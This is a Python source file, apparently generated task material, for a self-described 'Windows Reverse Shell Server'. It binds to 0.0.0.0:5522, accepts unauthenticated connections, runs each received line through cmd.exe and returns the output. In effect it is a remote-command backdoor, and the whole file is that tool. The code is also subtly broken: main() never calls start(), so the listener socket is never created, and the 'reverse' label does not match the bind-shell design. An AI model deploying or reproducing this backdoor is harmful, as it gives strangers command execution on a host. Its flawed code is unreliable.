import socket
import threading
from typing import Optional, Tuple, List
from data.code_scripts_PAST.stage3_DIMOS_test_v6.TASK_001_shell_result import ExecutionResult, ShellCommand, ConnectionInfo
from data.code_scripts_PAST.stage3_DIMOS_test_v6.TASK_002_shell_utils import spawn_shell_process, capture_output_stream


class WindowsCommandExecutor:
    """Executes commands via cmd.exe on a Windows system."""

    def __init__(self, host: str = "localhost", port: int = 5522) -> None:
        self.host = host
        self.port = port

    def execute_command(self, command: ShellCommand) -> ExecutionResult:
        """Execute a shell command via cmd.exe and capture the output.

        Args:
            command: A ShellCommand instance containing the command to execute.

        Returns:
            An ExecutionResult with stdout, stderr, return code, and duration.
        """
        process = spawn_shell_process(
            host=self.host,
            port=self.port,
            protocol='cmd',
            command=command.command,
            timeout_seconds=command.timeout_seconds
        )

        result = capture_output_stream(process, timeout_seconds=command.timeout_seconds)

        return result


class WindowsRemoteConnectionHandler:
    """Handles a single remote connection, spawning cmd.exe and capturing output."""

    def __init__(self, client_socket: socket.socket, host: str = "localhost", port: int = 5522) -> None:
        self.client_socket = client_socket
        self.host = host
        self.port = port
        self.running = True
        self.executor = WindowsCommandExecutor(host=host, port=port)

    def handle_connection(self) -> None:
        """Handle a single remote connection by executing commands and sending results."""
        try:
            while self.running:
                data = self.client_socket.recv(4096).decode('utf-8', errors='ignore')
                if not data or data.strip() == '':
                    break

                command_str = data.strip()
                if not command_str:
                    continue

                try:
                    shell_command = ShellCommand(command=command_str, timeout_seconds=30.0)
                    result = self.executor.execute_command(shell_command)

                    response = (
                        f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}\n"
                        f"Return Code: {result.return_code}\nDuration: {result.duration_ms:.2f}ms\n"
                    )
                    self.client_socket.sendall(response.encode('utf-8'))

                except Exception as e:
                    error_msg = f"Error executing command: {str(e)}\n"
                    self.client_socket.sendall(error_msg.encode('utf-8'))

        except socket.timeout:
            pass
        except ConnectionResetError:
            pass
        finally:
            self.running = False

    def close(self) -> None:
        """Close the connection handler and clean up resources."""
        self.running = False


class WindowsReverseShellServer:
    """Windows Command Shell reverse shell server that listens on 0.0.0.0:5522.

    Listens for incoming remote connections, spawns cmd.exe processes via
    spawn_shell_process(), captures output via capture_output_stream(), and
    sends results back over the socket using threading for concurrent handling.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 5522) -> None:
        self.host = host
        self.port = port
        self.server_socket: Optional[socket.socket] = None
        self.running = False

    def _accept_connection(self, client_socket: socket.socket, addr: Tuple[str, int]) -> None:
        """Accept a single connection and spawn a handler thread."""
        handler = WindowsRemoteConnectionHandler(client_socket=client_socket)
        thread = threading.Thread(target=handler.handle_connection, daemon=True)
        thread.start()

    def start(self) -> None:
        """Start the server listening on 0.0.0.0:5522."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(128)
        self.running = True

    def run(self) -> None:
        """Run the server in a loop, accepting connections and spawning threads."""
        try:
            while self.running:
                client_socket, addr = self.server_socket.accept()
                thread = threading.Thread(target=self._accept_connection, args=(client_socket, addr), daemon=True)
                thread.start()
        except KeyboardInterrupt:
            pass
        finally:
            if self.server_socket:
                self.server_socket.close()

    def stop(self) -> None:
        """Stop the server."""
        self.running = False
        if self.server_socket:
            self.server_socket.close()


def main() -> None:
    """Main entry point for the Windows reverse shell server."""
    server = WindowsReverseShellServer(host="0.0.0.0", port=5522)
    print(f"Windows Reverse Shell Server listening on 0.0.0.0:{server.port}")
    server.run()


if __name__ == "__main__":
    main()
